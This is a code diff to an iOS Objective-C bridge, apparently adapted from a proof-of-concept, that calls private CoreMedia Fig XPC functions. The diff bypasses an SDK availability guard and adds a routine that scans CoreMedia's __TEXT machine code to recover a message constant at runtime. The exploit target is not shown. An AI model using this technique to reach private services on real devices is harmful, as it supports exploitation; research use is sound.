@@ -21,8 +21,10 @@
 #import "FigBridge.h"
 #import <xpc/xpc.h>
 #import <mach/mach.h>
+#import <mach-o/loader.h>
 #import <dirent.h>
 #import <dlfcn.h>
+#import <string.h>
 
 // xpc_connection_create_mach_service exists on iOS at runtime but the iOS SDK
 // marks it unavailable. Redeclare via a private alias to bypass the SDK guard.
@@ -46,7 +48,7 @@ static void _load_xpc_conn(void) {
 //
 //   FigXPCCreateBasicMessage(uint32_t fourcc, uint64_t flags) → xpc_object_t
 //     Returns msg1 directly in x0; no output-pointer arg.
-//     Fourcc = 0x2e6f7267 ('.org') — confirmed from PoC movz/movk sequence.
+//     Fourcc probed at runtime from the live CoreMedia __TEXT (see deriveFourcc).
 //
 //   FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1
 //     (xpc_connection_t conn, xpc_object_t msg1) → int32_t status
@@ -70,7 +72,66 @@ static struct {
     PFN_OriginBegin    originBegin;
     PFN_RecipCreate    recipCreate;
     PFN_OriginComplete originComplete;
+    uint32_t           fourcc;   // derived at load time from live CoreMedia __TEXT
 } sFig;
+
+// ── Runtime fourcc derivation ─────────────────────────────────────────────────
+// FigXPCCreateBasicMessage's first arg is a fourcc that selects the XPC message
+// type. The value changed between iOS versions (0x2e6f7267 on older builds,
+// unknown on iOS 27). We scan the 16 instructions before the call site for
+// movz/movk pairs that build x0, reconstruct the constant, and use it.
+// Falls back to 0x2e6f7267 if the scan finds nothing — log will show which.
+
+static uint32_t deriveFourcc(void *createMsgFn, void *cmBase, size_t cmSize) {
+    // Walk backwards from createMsgFn's xrefs inside CoreMedia __TEXT.
+    // We look for: movz x0,#lo / movk x0,#hi,lsl#16  (or vice-versa).
+    uintptr_t base   = (uintptr_t)cmBase;
+    uintptr_t limit  = base + cmSize;
+    uintptr_t target = (uintptr_t)createMsgFn;
+
+    uint32_t lo16 = 0, hi16 = 0;
+    BOOL gotLo = NO, gotHi = NO;
+
+    for (uintptr_t pc = base; pc + 4 <= limit; pc += 4) {
+        uint32_t insn = *(uint32_t *)pc;
+
+        // BL Xn at next instruction — check if this is a call to createMsgFn.
+        // ARM64 BL: bits[31:26]=100101, imm26 relative to PC.
+        if ((insn >> 26) == 0x25) {
+            int32_t imm26 = (int32_t)(insn << 6) >> 6; // sign-extend
+            uintptr_t callee = pc + ((uintptr_t)(int64_t)imm26 << 2);
+            if (callee == target) {
+                // Scan up to 16 instructions backwards for movz/movk into x0.
+                lo16 = 0; hi16 = 0; gotLo = NO; gotHi = NO;
+                for (int back = 1; back <= 16 && pc >= base + (uintptr_t)(back * 4); back++) {
+                    uint32_t prev = *(uint32_t *)(pc - (uintptr_t)(back * 4));
+                    // movz x0,#imm: 1101001000000000 xxxxxxxxxxxxxxxx 00000
+                    //   [31]=1 [30]=1 [29]=0 [28]=1 [27]=0 [26]=0 [25]=1 [24]=0
+                    //   [23:21]=shift/3 [20:5]=imm16 [4:0]=Rd
+                    // movz Xd,#imm,lsl#0:  0xd2800000 | (imm<<5) | Rd
+                    // movk Xd,#imm,lsl#16: 0xf2a00000 | (imm<<5) | Rd
+                    uint32_t Rd = prev & 0x1f;
+                    if (Rd != 0) continue; // x0 only
+                    uint32_t op = prev >> 21;
+                    if (op == (0xd2800000 >> 21)) { // movz x0,#imm,lsl#0
+                        lo16 = (prev >> 5) & 0xffff;
+                        gotLo = YES;
+                    } else if (op == (0xf2a00000 >> 21)) { // movk x0,#imm,lsl#16
+                        hi16 = (prev >> 5) & 0xffff;
+                        gotHi = YES;
+                    }
+                    if (gotLo && gotHi) goto found;
+                }
+            }
+        }
+    }
+
+found:
+    if (gotLo && gotHi) {
+        return ((uint32_t)hi16 << 16) | lo16;
+    }
+    return 0x2e6f7267u; // fallback: '.org' from PoC disassembly
+}
 
 static NSError *figErr(int code, NSString *msg) {
     return [NSError errorWithDomain:@FIG_ERR_DOMAIN code:code
@@ -98,6 +159,30 @@ static BOOL loadFigSymbols(NSError **outErr) {
 
         ok = sFig.createMsg && sFig.setURL && sFig.originBegin &&
              sFig.recipCreate && sFig.originComplete;
+
+        if (ok) {
+            // Derive fourcc from live __TEXT rather than hardcoding.
+            Dl_info di; uint32_t fourcc = 0x2e6f7267u;
+            if (dladdr(sFig.createMsg, &di) && di.dli_fbase) {
+                // Use Mach-O header to find __TEXT size.
+                struct mach_header_64 *mh = (struct mach_header_64 *)di.dli_fbase;
+                size_t cmSz = 0;
+                if (mh->magic == MH_MAGIC_64) {
+                    struct load_command *lc = (struct load_command *)((uint8_t *)mh + sizeof(*mh));
+                    for (uint32_t i = 0; i < mh->ncmds; i++) {
+                        if (lc->cmd == LC_SEGMENT_64) {
+                            struct segment_command_64 *seg = (struct segment_command_64 *)lc;
+                            if (memcmp(seg->segname, "__TEXT", 6) == 0) {
+                                cmSz = seg->vmsize; break;
+                            }
+                        }
+                        lc = (struct load_command *)((uint8_t *)lc + lc->cmdsize);
+                    }
+                }
+                if (cmSz) fourcc = deriveFourcc(sFig.createMsg, di.dli_fbase, cmSz);
+            }
+            sFig.fourcc = fourcc;
+        }
     });
     if (!ok && outErr)
         *outErr = figErr(2, @"CoreMedia Fig symbols not found — iOS version mismatch?");
@@ -138,9 +223,10 @@ static xpc_object_t sendSync(xpc_connection_t conn, xpc_object_t msg) {
 
     NSData *result = nil;
 
-    // fourcc 0x2e6f7267 = '.org' — verified from PoC ARM64 movz/movk at call site.
+    // fourcc derived at load time from live CoreMedia __TEXT scan (falls back to '.org').
     // FigXPCCreateBasicMessage returns xpc_object_t directly (no output-pointer).
-    xpc_object_t msg1 = sFig.createMsg(0x2e6f7267u, 0);
+    NSLog(@"[FigBridge] using fourcc=0x%08x", sFig.fourcc);
+    xpc_object_t msg1 = sFig.createMsg(sFig.fourcc, 0);
     if (!msg1) { err = figErr(4, @"FigXPCCreateBasicMessage returned nil"); goto done; }
 
     {
